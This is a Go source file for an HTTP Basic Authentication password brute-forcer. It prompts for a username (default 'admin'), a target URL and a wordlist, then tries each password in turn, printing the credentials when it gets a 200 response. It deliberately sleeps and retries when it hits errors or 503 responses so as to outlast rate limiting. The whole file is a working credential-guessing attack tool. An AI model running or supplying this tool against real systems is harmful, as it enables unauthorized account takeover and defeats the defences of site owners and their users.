package main

import (
	"bufio"
	"fmt"
	"log"
	"net/http"
	"os"
	"time"
)

var username string
var scopeUrl string

func basicAuth(pass string) {
POINT:
	var passwd string = pass
	client := &http.Client{}
	req, err := http.NewRequest("GET", scopeUrl, nil)
	req.SetBasicAuth(username, passwd)
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Basic rate Limit alarm!!!")
		time.Sleep(12 * time.Second)
		err = nil
		goto POINT
	}

	if resp.StatusCode != 401 {
		if resp.StatusCode == 200 {
			fmt.Println("\nUsername: ", username, " Password: ", pass)
			os.Exit(0)
		}
		if resp.StatusCode == 503 {
			fmt.Println("Server delaying in reply. Waiting for reply by 15 second.")
			time.Sleep(time.Second * 15)
			goto POINT
		}
	}

	// fmt.Print(resp.StatusCode, " | Pass: ", pass, "\n")
}

func main() {
	username = "admin"
	fmt.Printf("Enter the Username (\"default:admin\"):")
	fmt.Scanln(&username)

	fmt.Printf("(to include http) Enter the Url :")
	fmt.Scanln(&scopeUrl)

	var vpath string
	fmt.Printf("Enter the wordlist path: ")
	fmt.Scanln(&vpath)
	readFile, err := os.Open(vpath)

	fmt.Println("\nUsername: ", username, "\nUrl: ", scopeUrl, "\nWordlist:", vpath)

	if err != nil {
		log.Fatal(err)
	}

	fileScanner := bufio.NewScanner(readFile)
	fileScanner.Split(bufio.ScanLines)

	var password string

	var i, j int = 0, 250

	for fileScanner.Scan() {

		password = fileScanner.Text()
		basicAuth(password)
		i = i + 1
		if i > j {
			i = i + 1
			fmt.Println("Notification You tried the ", j, "th password. Still no results! ( pass: ", password, ")")
			j = j + 250
		}
	}
	readFile.Close()
}
